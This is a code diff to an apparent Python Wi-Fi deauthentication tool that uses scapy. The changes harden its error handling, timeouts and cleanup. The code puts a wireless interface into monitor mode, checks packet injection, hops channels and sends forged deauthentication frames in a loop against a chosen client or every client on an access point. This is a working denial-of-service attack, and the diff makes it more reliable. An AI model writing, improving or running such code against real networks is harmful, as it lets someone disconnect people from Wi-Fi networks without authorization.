@@ -39,7 +39,7 @@ _DEFAULT_HOP_INTERVAL = 0.5  # seconds per channel
 try:
     from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
     _SCAPY_OK = True
-except ImportError:
+except (ImportError, OSError):
     _SCAPY_OK = False
 
 BROADCAST = "ff:ff:ff:ff:ff:ff"
@@ -73,9 +73,9 @@ def _enable_monitor(iface: str) -> bool:
     Returns True if successful, False if the chip does not support it.
     """
     rprint(f"[yellow][!][/yellow] Attempting to activate monitor mode on {iface}...")
-    subprocess.run(["ip", "link", "set", iface, "down"],            capture_output=True)
-    subprocess.run(["iw", "dev", iface, "set", "type", "monitor"],  capture_output=True)
-    subprocess.run(["ip", "link", "set", iface, "up"],              capture_output=True)
+    subprocess.run(["ip", "link", "set", iface, "down"], capture_output=True, timeout=10, check=True)
+    subprocess.run(["iw", "dev", iface, "set", "type", "monitor"], capture_output=True, timeout=10, check=True)
+    subprocess.run(["ip", "link", "set", iface, "up"], capture_output=True, timeout=10, check=True)
     time.sleep(1)
     return _check_monitor_mode(iface)
 
@@ -83,9 +83,13 @@ def _enable_monitor(iface: str) -> bool:
 def _disable_monitor(iface: str) -> None:
     """Restore *iface* to managed mode. Best-effort, swallows errors."""
     rprint(f"[dim][·] Restoring {iface} to managed mode...[/dim]")
-    subprocess.run(["ip", "link", "set", iface, "down"],            capture_output=True)
-    subprocess.run(["iw", "dev", iface, "set", "type", "managed"],  capture_output=True)
-    subprocess.run(["ip", "link", "set", iface, "up"],              capture_output=True)
+    for cmd in (["ip", "link", "set", iface, "down"],
+                ["iw", "dev", iface, "set", "type", "managed"],
+                ["ip", "link", "set", iface, "up"]):
+        try:
+            subprocess.run(cmd, capture_output=True, timeout=10, check=True)
+        except (OSError, subprocess.SubprocessError) as exc:
+            rprint(f"[yellow]Interface restoration step failed: {exc}[/yellow]")
 
 
 def _injection_supported(iface: str) -> bool | None:
@@ -113,10 +117,13 @@ def _injection_supported(iface: str) -> bool | None:
 
 def _set_channel(iface: str, channel: int) -> bool:
     """`iw dev <iface> set channel <ch>`. True if retcode == 0."""
-    proc = subprocess.run(
-        ["iw", "dev", iface, "set", "channel", str(channel)],
-        capture_output=True,
-    )
+    try:
+        proc = subprocess.run(
+            ["iw", "dev", iface, "set", "channel", str(channel)],
+            capture_output=True, timeout=2,
+        )
+    except (OSError, subprocess.SubprocessError):
+        return False
     return proc.returncode == 0
 
 
@@ -148,7 +155,7 @@ class _ChannelHopper:
     def stop(self) -> None:
         self._stop.set()
         if self._thread:
-            self._thread.join(timeout=2)
+            self._thread.join()
 
     def _loop(self) -> None:
         i = 0
@@ -196,7 +203,7 @@ def deauth_target(
                      performed in bg over 1/6/11.
     """
     if not _SCAPY_OK:
-        rprint("[red][✗] Scapy not installed. pip install scapy[/red]")
+        rprint("[red][✗] Scapy unavailable. Check installation and socket permissions.[/red]")
         return
 
     if not check_root():
@@ -210,53 +217,30 @@ def deauth_target(
         rprint(f"[red][✗] Invalid target MAC: {target_mac}[/red]")
         return
 
+    if count < 0 or interval < 0 or (channel is not None and channel <= 0):
+        raise ValueError("count/interval must be non-negative and channel positive")
     we_enabled_monitor = False
-    if not _check_monitor_mode(iface):
-        rprint(f"[yellow][!][/yellow] {iface} is not in monitor mode.")
-        if not _enable_monitor(iface):
-            rprint(f"[bold red][✗] Could not enable monitor mode on {iface}.[/bold red]")
-            rprint("[dim]On Android: your WiFi chip probably does not support this.\n"
-                   "Workaround: Alfa AWUS036ACH over OTG, or run from a RPi/Kali.[/dim]")
-            return
-        we_enabled_monitor = True
-
-    # Injection test — only if we have aireplay-ng. Otherwise, we continue.
-    injection = _injection_supported(iface)
-    if injection is False:
-        rprint("[bold red][✗] The chipset does NOT support packet injection.[/bold red]")
-        rprint("[dim]aireplay-ng --test reported failure. Switch WiFi adapter.[/dim]")
-        if we_enabled_monitor:
-            _disable_monitor(iface)
-        return
-    if injection is True:
-        rprint("[green][✓][/green] Injection verified with aireplay-ng.")
-    else:
-        rprint("[dim][·] aireplay-ng not installed; skipping injection test.[/dim]")
-
-    # Channel hopping if no explicit channel is specified.
     hopper: _ChannelHopper | None = None
-    if channel is not None:
-        if _set_channel(iface, channel):
-            rprint(f"[dim][·] Channel set to {channel}.[/dim]")
-        else:
-            rprint(f"[yellow][!][/yellow] Could not set channel {channel}; trying anyway.")
-    else:
-        rprint(f"[dim][·] Channel hopping {_DEFAULT_HOP_CHANNELS} every "
-               f"{_DEFAULT_HOP_INTERVAL}s.[/dim]")
-        hopper = _ChannelHopper(iface)
-        hopper.start()
-
-    frame          = _build_deauth(target_mac, bssid)
-    target_display = "BROADCAST (all)" if target_mac == BROADCAST else target_mac
-
-    rprint(f"\n[bold red][☠][/bold red] Deauth started")
-    rprint(f"  Target    : [cyan]{target_display}[/cyan]")
-    rprint(f"  AP (BSSID): [cyan]{bssid}[/cyan]")
-    rprint(f"  Interface : [cyan]{iface}[/cyan]")
-    rprint(f"  Ctrl+C to stop.\n")
-
     sent = 0
     try:
+        if not _check_monitor_mode(iface):
+            # Restoration is required even if enabling fails halfway through.
+            we_enabled_monitor = True
+            if not _enable_monitor(iface):
+                rprint(f"[red]Could not enable monitor mode on {iface}.[/red]")
+                return
+        if _injection_supported(iface) is False:
+            rprint("[red]Injection test failed.[/red]")
+            return
+        if channel is not None:
+            if not _set_channel(iface, channel):
+                rprint(f"[yellow]Could not set channel {channel}; stopping.[/yellow]")
+                return
+        else:
+            hopper = _ChannelHopper(iface)
+            hopper.start()
+        frame = _build_deauth(target_mac, bssid)
+        rprint(f"[bold red]Deauth started on {iface}. Ctrl+C to stop.[/bold red]")
         while count == 0 or sent < count:
             # sendp(inter=) only spaces packets within a single call, so pace
             # the per-frame sends here instead.
@@ -267,10 +251,12 @@ def deauth_target(
     except KeyboardInterrupt:
         rprint(f"\n[bold yellow][!][/bold yellow] Stopped. {sent} frames total.")
     finally:
-        if hopper:
-            hopper.stop()
-        if we_enabled_monitor:
-            _disable_monitor(iface)
+        try:
+            if hopper:
+                hopper.stop()
+        finally:
+            if we_enabled_monitor:
+                _disable_monitor(iface)
 
 
 if __name__ == "__main__":
